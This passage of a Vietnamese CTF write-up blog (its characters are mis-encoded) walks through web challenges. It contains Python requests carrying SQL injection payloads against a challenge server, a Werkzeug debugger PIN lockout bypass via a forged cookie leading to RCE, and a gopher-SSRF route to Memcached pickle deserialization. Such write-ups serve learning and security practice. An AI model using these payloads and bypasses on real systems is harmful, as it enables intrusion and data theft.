</span></span></code></pre></div><p>vÃ  trong view nÃ y cÅ©ng cÃ³ chá»©a 2 columns lÃ  <code>table_schema</code> vÃ  <code>table_name</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://45.77.240.178:8002/index.php&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;id&#39;</span>: <span style=color:#e6db74>&#39;5 union/*&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>1000000</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()&#39;</span>
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p><img loading=lazy src=https://i.imgur.com/xKdXXBS.jpg alt></p><p>Table name: <code>Th1z_Fack1n_Fl4444g_Tabl3</code></p><h3 id=get-flag-without-knowing-column-name>Get flag without knowing column name<a hidden class=anchor aria-hidden=true href=#get-flag-without-knowing-column-name>#</a></h3><p>CÃ¡ch nÃ y Ä‘Ã£ Ä‘Æ°á»£c anh @tsug0d mÃ´ táº£ cá»±c kÃ¬ chi tiáº¿t vÃ  dá»… hiá»ƒu trong <a href=https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/>blog</a> cá»§a anh nÃªn mÃ¬nh khÃ´ng dÃ i dÃ²ng ná»¯a. Get flag thÃ´i!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://45.77.240.178:8002/index.php&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;id&#39;</span>: <span style=color:#e6db74>&#39;5 union/*&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;a&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>1000000</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x&#39;</span>
</span></span><span style=display:flex><span>})
</span></span></code></pre></div><p><img loading=lazy src=https://i.imgur.com/iAgHzHz.jpg alt></p><h3 id=another-way-from-the-author>Another way from the author<a hidden class=anchor aria-hidden=true href=#another-way-from-the-author>#</a></h3><p><img loading=lazy src=https://i.imgur.com/PVK8WBT.jpg alt>
ğŸ‰ğŸ‰ğŸ‰</p><h2 id=the-prophet>The Prophet<a hidden class=anchor aria-hidden=true href=#the-prophet>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Wohoo, wanna hear some oracle?
</span></span></code></pre></div><p>BÃ i nÃ y chá»‰ cÃ³ 1 chá»©c nÄƒng cÆ¡ báº£n lÃ  Ä‘á»c cÃ¡c file text cÃ³ tÃªn tá»« 1 - 5. Khi ta thá»­ file <code>6.txt</code>, trang xuáº¥t hiá»‡n giao diá»‡n thÃ´ng bÃ¡o lá»—i cá»§a Flask, chá»©ng tá» debug mode Ä‘ang Ä‘Æ°á»£c enabled.
Trong giao diá»‡n bÃ¡o lá»—i, chÃºng ta cÃ³ thá»ƒ Ä‘á»c 1 pháº§n source code Ä‘Ã£ bá»‹ disclosed:</p><p><img loading=lazy src=https://i.imgur.com/WvzEivs.jpg alt></p><p>Ta dá»… dÃ ng tháº¥y Ä‘Æ°á»£c lá»—i Local File Inclusion (LFI) trong Ä‘oáº¡n code xá»­ lÃ­ Ä‘á»c file nÃ y. Biáº¿n <code>filename</code> Ä‘Æ°á»£c truyá»n tháº³ng Ä‘áº¿n hÃ m <code>open()</code> vÃ  ná»™i dung Ä‘Æ°á»£c Ä‘Æ°a ra ngoÃ i thÃ´ng qua hÃ m <code>render_template()</code>.</p><p>Ngay lÃºc nÃ y, mÃ¬nh nháº­n ra ráº±ng viá»‡c chÃºng ta cÃ³ lá»—i LFI sáº½ dáº«n Ä‘áº¿n viá»‡c cÃ³ thá»ƒ <a href=https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/>generate</a> Ä‘Æ°á»£c debugger PIN code, sau Ä‘Ã³ sá»­ dá»¥ng chá»©c nÄƒng Interactive shell Ä‘Æ°á»£c tÃ­ch há»£p trong giao diá»‡n lá»—i cá»§a Flask Ä‘á»ƒ cÃ³ thá»ƒ leverage lÃªn RCE.</p><p>Sau khi lÃ m theo bÃ i hÆ°á»›ng dáº«n generate PIN code vÃ  Ä‘Ã£ cÃ³ Ä‘Æ°á»£c PIN, giá» chá»‰ viá»‡c submit PIN vÃ  RCE thÃ´i, nhÆ°ng Ä‘á»i khÃ´ng nhÆ° mÆ¡ vÃ  cuá»™c sá»‘ng khÃ´ng dá»… thá»Ÿ&mldr;</p><p><img loading=lazy src=https://i.imgur.com/lP07KrD.jpg alt></p><p>Ok, tá»± trong Ä‘áº§u nghÄ© cháº¯c Ä‘Ã¢y cÅ©ng lÃ  Ã½ cá»§a tÃ¡c giáº£ thÃ´i, cháº¯c cÃ³ chá»— nÃ o Ä‘Ã¢u Ä‘Ã³ trong pháº§n xá»­ lÃ­ nháº­p PIN nÃ y cÃ³ thá»ƒ vÆ°á»£t Ä‘Æ°á»£c, let check it out. ğŸ§</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>hash_pin</span>(pin):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> isinstance(pin, text_type):
</span></span><span style=display:flex><span>        pin <span style=color:#f92672>=</span> pin<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf-8&#34;</span>, <span style=color:#e6db74>&#34;replace&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(pin <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;shittysalt&#34;</span>)<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>12</span>]
</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>DebuggedApplication</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_pin_trust</span>(self, environ):
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#e6db74>&#34;&#34;&#34;Checks if the request passed the pin test.  This returns `True` if the
</span></span></span><span style=display:flex;background-color:#3c3d38><span><span style=color:#e6db74>        request is trusted on a pin/cookie basis and returns `False` if not.
</span></span></span><span style=display:flex;background-color:#3c3d38><span><span style=color:#e6db74>        Additionally if the cookie&#39;s stored pin hash is wrong it will return
</span></span></span><span style=display:flex;background-color:#3c3d38><span><span style=color:#e6db74>        `None` so that appropriate action can be taken.
</span></span></span><span style=display:flex;background-color:#3c3d38><span><span style=color:#e6db74>        &#34;&#34;&#34;</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>pin <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex;background-color:#3c3d38><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        val <span style=color:#f92672>=</span> parse_cookie(environ)<span style=color:#f92672>.</span>get(self<span style=color:#f92672>.</span>pin_cookie_name)
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> val <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;|&#34;</span> <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> val:
</span></span><span style=display:flex;background-color:#3c3d38><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        ts, pin_hash <span style=color:#f92672>=</span> val<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;|&#34;</span>, <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> ts<span style=color:#f92672>.</span>isdigit():
</span></span><span style=display:flex;background-color:#3c3d38><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>if</span> pin_hash <span style=color:#f92672>!=</span> hash_pin(self<span style=color:#f92672>.</span>pin):
</span></span><span style=display:flex;background-color:#3c3d38><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>return</span> (time<span style=color:#f92672>.</span>time() <span style=color:#f92672>-</span> PIN_TIME) <span style=color:#f92672>&lt;</span> int(ts)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pin_auth</span>(self, request):
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;&#34;&#34;Authenticates with the pin.&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>        exhausted <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        auth <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        trust <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>check_pin_trust(request<span style=color:#f92672>.</span>environ)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># If the trust return value is `None` it means that the cookie is</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># set but the stored pin hash value is bad.  This means that the</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># pin was changed.  In this case we count a bad auth and unset the</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># cookie.  This way it becomes harder to guess the cookie name</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># instead of the pin as we still count up failures.</span>
</span></span><span style=display:flex><span>        bad_cookie <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> trust <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>_fail_pin_auth()
</span></span><span style=display:flex><span>            bad_cookie <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#75715e># If we&#39;re trusted, we&#39;re authenticated.</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>elif</span> trust:
</span></span><span style=display:flex;background-color:#3c3d38><span>            auth <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#75715e># If we failed too many times, then we&#39;re locked out.</span>
</span></span><span style=display:flex;background-color:#3c3d38><span>        <span style=color:#66d9ef>elif</span> self<span style=color:#f92672>.</span>_failed_pin_auth <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>10</span>:
</span></span><span style=display:flex;background-color:#3c3d38><span>            exhausted <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># Otherwise go through pin based authentication</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            entered_pin <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;pin&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> entered_pin<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;-&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>==</span> self<span style=color:#f92672>.</span>pin<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;-&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>):
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>_failed_pin_auth <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>                auth <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>_fail_pin_auth()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        rv <span style=color:#f92672>=</span> Response(
</span></span><span style=display:flex><span>            json<span style=color:#f92672>.</span>dumps({<span style=color:#e6db74>&#34;auth&#34;</span>: auth, <span style=color:#e6db74>&#34;exhausted&#34;</span>: exhausted}),
</span></span><span style=display:flex><span>            mimetype<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;application/json&#34;</span>,
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> auth:
</span></span><span style=display:flex><span>            rv<span style=color:#f92672>.</span>set_cookie(
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>pin_cookie_name,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>|</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (int(time<span style=color:#f92672>.</span>time()), hash_pin(self<span style=color:#f92672>.</span>pin)),
</span></span><span style=display:flex><span>                httponly<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>            )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> bad_cookie:
</span></span><span style=display:flex><span>            rv<span style=color:#f92672>.</span>delete_cookie(self<span style=color:#f92672>.</span>pin_cookie_name)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> rv
</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
</span></span></code></pre></div><p>Hai dÃ²ng Ä‘Æ°á»£c highlight lÃ  cÃ¢u lá»‡nh if kiá»ƒm tra Ä‘iá»u kiá»‡n náº¿u nháº­p sai quÃ¡ 10 láº§n thÃ¬ <code>exhausted = True</code>, tá»« Ä‘Ã³ ta suy ra Ä‘Ã£ cÃ³ ngÆ°á»i submit sai PIN khoáº£ng 7 - 8 láº§n trÆ°á»›c Ä‘Ã³, Ä‘á»ƒ Ä‘áº¿n lÆ°á»£t mÃ¬nh thÃ¬ sau khi thá»­ 2 - 3 mÃ£ PIN thÃ¬ nÃ³ lÃªn 10. ğŸ˜¤</p><p>Ok, quay láº¡i nÃ o. VÃ¬ cÃ¢u Ä‘iá»u kiá»‡n check nháº­p sai náº±m trong nhÃ¡nh <code>elif</code> nÃªn chá»‰ cáº§n 2 cÃ¢u Ä‘iá»u kiá»‡n á»Ÿ trÃªn Ä‘Ãºng thÃ¬ sáº½ khÃ´ng thá»±c thi. Biáº¿n <code>trust</code> Ä‘Æ°á»£c khá»Ÿi táº¡o vá»›i value lÃ  return value cá»§a hÃ m <code>check_pin_trust()</code>, hÃ m nÃ y thá»±c hiá»‡n get vÃ  parse cookie, kiá»ƒm tra PIN hash trong cookie cÃ³ Ä‘Ãºng vá»›i PIN hash trÃªn server hay khÃ´ng, PIN expired time cÃ³ háº¿t háº¡n hay chÆ°a.</p><p>VÃ¬ chÃºng ta cÃ³ thá»ƒ control Ä‘Æ°á»£c cookie nÃªn ta cÃ³ thá»ƒ tÃ¹y biáº¿n Ä‘Æ°á»£c cookie Ä‘á»ƒ vÆ°á»£t qua Ä‘Æ°á»£c viá»‡c check exhausted. MÃ¬nh Ä‘Ã£ cÃ³ quyá»n cháº¡y Python code trÃªn interactive shell rá»“i, tÃ¬m vÃ  Ä‘á»c flag ráº¥t dá»… dÃ ng.</p><h3 id=author-nÃ³i-gÃ¬>Author nÃ³i gÃ¬?<a hidden class=anchor aria-hidden=true href=#author-nÃ³i-gÃ¬>#</a></h3><p>Ok, giáº£i xong inbox author thÃ¬ áº£nh báº£o chá»‰ cáº§n generate PIN code lÃ  xong rá»“i RCE láº¥y flag thÃ´i, táº¡i lÃºc Ä‘Ã³ setup cÃ³ váº¥n Ä‘á» nÃªn má»›i bá»‹ exhausted. ğŸ˜¤</p><h2 id=meepwntube2050>MeePwnTube2050<a hidden class=anchor aria-hidden=true href=#meepwntube2050>#</a></h2><p><img loading=lazy src=https://i.imgur.com/PtWQV2F.jpg alt></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view
</span></span></code></pre></div><p>BÃ i nÃ y mÃ¬nh stuck Ä‘áº¿n ngÃ y hÃ´m sau má»›i nghÄ© Ä‘Æ°á»£c hÆ°á»›ng ğŸ˜…</p><p>VÃ¬ mÃ¬nh ngÃ¢m Ä‘i ngÃ¢m láº¡i source code nhiá»u láº§n Ä‘á»ƒ cháº¯c cháº¯n ráº±ng khÃ´ng cÃ³ 1 lá»—i nÃ o cÃ³ thá»ƒ xáº£y ra, vÃ  Ä‘áº¿n khi mÃ¬nh chá»£t Ä‘á»ƒ Ã½ 1 chi tiáº¿t nhá» trong search.php:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;dbconnect.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$_IP <span style=color:#f92672>=</span> $_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;search&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($_IP <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;45.76.148.212&#34;</span>){
</span></span><span style=display:flex><span>            <span style=color:#75715e>//local only homie
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $Name <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;search&#39;</span>];
</span></span><span style=display:flex><span>            $_search <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($admin_conn,$Name);
</span></span><span style=display:flex><span>            $Execquery <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($admin_conn, <span style=color:#e6db74>&#34;SELECT id,Name FROM search WHERE Name LIKE &#39;%</span><span style=color:#e6db74>$_search</span><span style=color:#e6db74>%&#39; LIMIT 8&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> ($Result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_fetch_array</span>($Execquery)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;center&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;b&gt;&lt;p style=&#39;font-size:20px; color:green&#39;&gt;&#34;</span><span style=color:#f92672>.</span>$Result[<span style=color:#e6db74>&#39;Name&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&lt;/b&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;iframe src=&#39;video&#34;</span><span style=color:#f92672>.</span>$Result[<span style=color:#e6db74>&#39;id&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.php&#39; width=&#39;1200&#39; height=&#39;300&#39;&gt;&lt;/iframe&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/center&gt;&#34;</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $Name <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;search&#39;</span>];
</span></span><span style=display:flex><span>            $_search <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($conn,$Name);
</span></span><span style=display:flex><span>            $Execquery <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($conn, <span style=color:#e6db74>&#34;SELECT id,Name FROM search WHERE Name LIKE &#39;%</span><span style=color:#e6db74>$_search</span><span style=color:#e6db74>%&#39; LIMIT 8&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> ($Result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_fetch_array</span>($Execquery)) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;center&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;b&gt;&lt;p style=&#39;font-size:20px; color:green&#39;&gt;&#34;</span><span style=color:#f92672>.</span>$Result[<span style=color:#e6db74>&#39;Name&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&lt;/b&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;iframe src=&#39;video&#34;</span><span style=color:#f92672>.</span>$Result[<span style=color:#e6db74>&#39;id&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;.php&#39; width=&#39;1200&#39; height=&#39;300&#39;&gt;&lt;/iframe&gt;&#34;</span>;
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;/center&gt;&#34;</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Táº¡i dÃ²ng 10 náº¿u IP lÃ  <code>45.76.148.212</code> (cÅ©ng lÃ  IP cá»§a bot) thÃ¬ nÃ³ sáº½ láº¥y giÃ¡ trá»‹ tá»« <code>DB_ADMIN</code> chá»© khÃ´ng pháº£i láº¥y giÃ¡ trá»‹ tá»« DB thÆ°á»ng. Tá»« Ä‘Ã³ lÃ m mÃ¬nh nghÄ© ngay tá»›i bÃ i <a href=https://ctftime.org/task/8659>secret note keeper</a> trong giáº£i <a href=https://ctftime.org/event/781>Facebook CTF 2019</a> mÃ  anh @ducnt Ä‘Ã£ giáº£i vÃ  viáº¿t <a href=http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html>writeup</a> trÆ°á»›c Ä‘Ã³.</p><p>Pháº§n cÃ²n láº¡i Ä‘á»ƒ cÃ¡c báº¡n tráº£ lá»i&mldr; ğŸ˜ª</p><h2 id=hellovietnamv2>HelloVietNamv2<a hidden class=anchor aria-hidden=true href=#hellovietnamv2>#</a></h2><p><a href="https://www.youtube.com/watch?v=ZqjhmdRgXMw">https://www.youtube.com/watch?v=ZqjhmdRgXMw</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Source: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view
</span></span></code></pre></div><p>BÃ i nÃ y cÅ©ng lÃ  1 bÃ i bá»‹ setup lá»—i, dáº«n Ä‘áº¿n nhiá»u team trong Ä‘Ã³ cÃ³ mÃ¬nh giáº£i theo hÆ°á»›ng unintended (Command Injection) thay vÃ¬ intended (Memcached Injection). Trong pháº§n nÃ y mÃ¬nh sáº½ chá»‰ nÃ³i vá» <a href=https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf>cÃ¡ch intended cá»§a tÃ¡c giáº£</a>.</p><h3 id=wheres-the-real-bug-in-the-source-code>Where&rsquo;s the real bug in the source code?<a hidden class=anchor aria-hidden=true href=#wheres-the-real-bug-in-the-source-code>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/loadexternalvideo&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>loadexternalvideo</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>            _url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;video_url&#39;</span>]
</span></span><span style=display:flex><span>            <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span>            file <span style=color:#f92672>=</span> parse(_url)
</span></span><span style=display:flex><span>            <span style=color:#75715e># ...</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
</span></span></code></pre></div><p>Náº¿u cÃ¡c báº¡n Ä‘á»ƒ Ã½ táº¡i hÃ m xá»­ lÃ­ route <code>/loadexternalvideo</code> sáº½ tháº¥y 1 lá»—i SSRF. HÃ m <code>parse()</code> sá»­ dÃ¹ng PyCurl Ä‘á»ƒ request. Theo nhÆ° documentation thÃ¬ PyCurl lÃ  1 interface cá»§a libcurl vÃ  Ä‘Ã¢y lÃ  nhá»¯ng protocol libcurl há»— trá»£:</p><p><img loading=lazy src=https://i.imgur.com/pV7bHx7.jpg alt></p><p>Váº­y lÃ  chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng Gopher protocol, sound good!</p><p>Váº­y Memcached Injection náº±m á»Ÿ Ä‘Ã¢u? Náº±m á»Ÿ chá»— sá»­ dá»¥ng thÆ° viá»‡n <code>pylibmc</code> trong Python. Náº¿u ai Ä‘Ã£ Ä‘á»c qua slide Ä‘Æ°á»£c trÃ¬nh bÃ y táº¡i há»™i nghá»‹ Black Hat thÃ¬ cÅ©ng Ä‘Ã£ tháº¥y cÃ¡i table nÃ y:</p><p><img loading=lazy src=https://i.imgur.com/VvpXZM8.jpg alt></p><p>ChÃºng ta cÃ³ thá»ƒ tháº¥y, náº¿u dá»¯ liá»‡u chÃºng ta <code>set</code> vÃ o key lÃ  1 Pickle serialized data thÃ¬ khi <code>get</code> cÃ¡i key nÃ y, tÃ¹y theo <code>flags</code> mÃ  chÃºng ta gá»­i lÃªn mÃ  <code>pylibmc</code> cÃ³ deserialize Pickle hay khÃ´ng.</p><p><img loading=lazy src=https://i.imgur.com/GhRjWz5.jpg alt>
Flag for Pickle deserialization: <code>(1 &lt;&lt; 0) = 1</code></p><p>Váº­y chÃºng ta trigger Ä‘Æ°á»£c payload báº±ng cÃ¡ch nÃ o? CÃ¹ng xem láº¡i Ä‘oáº¡n code sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>racingboiz101</span>(_key, _value):
</span></span><span style=display:flex;background-color:#3c3d38><span>    _speedup101 <span style=color:#f92672>=</span> pylibmc<span style=color:#f92672>.</span>Client([<span style=color:#e6db74>&#34;127.0.0.1:11211&#34;</span>], binary<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
